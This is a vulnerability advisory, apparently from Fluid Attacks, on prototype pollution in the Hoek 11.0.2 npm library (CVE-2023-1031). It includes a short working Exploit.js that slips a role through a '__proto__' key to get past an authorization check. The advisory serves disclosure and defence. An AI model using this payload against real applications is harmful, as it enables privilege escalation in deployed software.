---
slug: advisories/brejcha/
title: Hoek 11.0.2 - Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: brejcha
product: Hoek 11.0.2 - Prototype Pollution
date: 2023-03-06 12:00 COT
cveid: CVE-2023-1031
severity: 7.3
description: Hoek v11.0.2         -         Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, Prototype Pollution, Hoek, NPM
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Hoek v11.0.2 - Prototype Pollution                                 |
| **Code name**         | [Brejcha](https://es.wikipedia.org/wiki/Boris_Brejcha)             |
| **Product**           | Hoek                                                               |
| **Affected versions** | Version 11.0.2                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-03-06                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-1031](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1031)                                               |

## Description

Hoek version 110.2 allows an external attacker to editor add new properties
to an object. This is possible because the application does not properly
validate incoming JSON keys, thus allowing the `__proto__` property to be
edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when a
third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so, then
it calls it. If not, it looks in the object's prototype. If the method/attribute
is also not in the object's prototype, then the property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property into an
object, he will succeed in injecting or editing its properties.

## Exploitation

### Exploit.js

```js
const Hoek = require('@hapi/hoek');

let normal_user_request    = {"user":"bob","role":"admin"};
let malicious_user_request = {"user":"hacker","__proto__":{"role":"admin"}};

const create_user = (new_user) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    if(new_user.hasOwnProperty("role")) {
        console.log("Unauthorized Action");
    }
    else {
        user = Hoek.clone(new_user);
        console.log(user?.role);
    }
}

create_user(normal_user_request);
create_user(malicious_user_request);
```

### Evidence of exploitation

![hoek-exploitation-evidence](https://user-images.githubusercontent.com/51862990/221669107-0ef0d401-f50b-42c4-95d9-0aa11dc95b98.png)

## Our security policy

We have reserved the ID CVE-2023-1031 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Hoek 11.0.2

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/hapijs/hoek/>

## Timeline

<time-lapse
  discovered="2023-02-27"
  contacted="2023-02-27"
  replied="2023-02-27"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
